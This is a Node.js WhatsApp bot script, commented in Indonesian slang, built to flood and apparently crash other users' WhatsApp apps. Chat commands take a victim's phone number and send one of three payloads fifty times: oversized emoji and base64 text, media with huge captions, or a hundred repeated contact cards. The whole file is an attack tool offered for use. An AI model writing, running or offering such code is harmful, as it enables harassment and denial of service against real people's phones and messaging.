const { Boom} = require('@hapi/boom');
const { default: makeWASocket, DisconnectReason, useMultiFileAuthState, fetchLatestBaileysVersion, generateWAMessageFromContent} = require('@whiskeysockets/baileys');
const P = require('pino');

async function startBot() {
    const { state, saveCreds} = await useMultiFileAuthState('auth_info_baileys');
    const { version} = await fetchLatestBaileysVersion();
    const sock = makeWASocket({
        logger: P({ level: 'silent' }),
        printQRInTerminal: false, // Matikan QR, kita pake pairing code
        auth: state,
        version
    });

    // Generate pairing code
    if (!state.creds.registered) {
        const phoneNumber = '6281234567890'; // Ganti dengan nomor lo (format 62xxxxxxxxxx)
        const pairingCode = await sock.requestPairingCode(phoneNumber);
        console.log(`Pairing Code lo:${pairingCode}, masukin ke WhatsApp di device lain!`);}
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect} = update;
        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode!== DisconnectReason.loggedOut;
            console.log('Koneksi putus, reconnect, bro...', lastDisconnect?.error, shouldReconnect);
            if (shouldReconnect) {
                startBot();}        } else if (connection === 'open') {
            console.log('Bot nyala, siap bikin ambruk WhatsApp target!');}    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('messages.upsert', async ({ messages }) => {
        const msg = messages[0];
        if (!msg.message || msg.key.fromMe) return;

        const from = msg.key.remoteJid;
        const text = msg.message.conversation || msg.message.extendedTextMessage?.text || '';
        const sender = msg.key.participant || msg.key.remoteJid;

        // Fungsi untuk kirim pesan berat
        async function sendHeavyPayload(target, type) {
            let payload;
            if (type === 'payload1') {
                // Payload 1: Teks berat dengan karakter aneh
                payload = '😈'.repeat(10000) + '\n'.repeat(5000) + Buffer.from('CRASH').toString('base64').repeat(2000);} else if (type === 'payload2') {
                // Payload 2: Kombinasi media dan teks berat
                payload = {
                    image: { url: 'https://example.com/largeimage.jpg'},                    caption: '💥'.repeat(15000) + Buffer.from('EXPLOIT').toString('base64').repeat(1000)
                };} else if (type === 'payload3') {
                // Payload 3: Spam kontak berulang
                payload = {
                    contacts: Array(100).fill({
                        displayName: 'CRASH_CONTACT',
                        vcard:`BEGIN:VCARD\nVERSION:3.0\nN:;CRASH;;;\nFN:CRASH\nTEL;TYPE=CELL:${target}\nEND:VCARD`
                    })
                };}            // Kirim payload 50 kali untuk pastikan crash
            for (let i = 0; i < 50; i++) {
                await sock.sendMessage(target, payload);
                await new Promise(resolve => setTimeout(resolve, 100));}            await sock.sendMessage(from, { text:`Payload${type} berhasil dikirim ke${target}, WhatsApp mereka udah pasti KO!` });}
        // Menu payload
        if (text.toLowerCase() === '.menu') {
            const menu =`🔥 Menu Payload Berbahaya🔥.payload1 [nomor] - Spam teks berat bikin lag.payload2 [nomor] - Kombinasi media dan teks crash.payload3 [nomor] - Spam kontak berulang
Contoh:.payload1 6288975147551`;
            await sock.sendMessage(from, { text: menu });}
        // Eksekusi payload
        if (text.startsWith('.payload1 ')) {
            const target = text.split(' ')[1];
            if (!target.startsWith('62')) return sock.sendMessage(from, { text: 'Nomor harus format 62xxxxxxxxxxx' });
            await sendHeavyPayload(target + '@s.whatsapp.net', 'payload1');} else if (text.startsWith('.payload2 ')) {
            const target = text.split(' ')[1];
            if (!target.startsWith('62')) return sock.sendMessage(from, { text: 'Nomor harus format 62xxxxxxxxxxx' });
            await sendHeavyPayload(target + '@s.whatsapp.net', 'payload2');} else if (text.startsWith('.payload3 ')) {
            const target = text.split(' ')[1];
            if (!target.startsWith('62')) return sock.sendMessage(from, { text: 'Nomor harus format 62xxxxxxxxxxx' });
            await sendHeavyPayload(target + '@s.whatsapp.net', 'payload3');}    });}
startBot().catch(err => console.error('Error mulai bot:', err));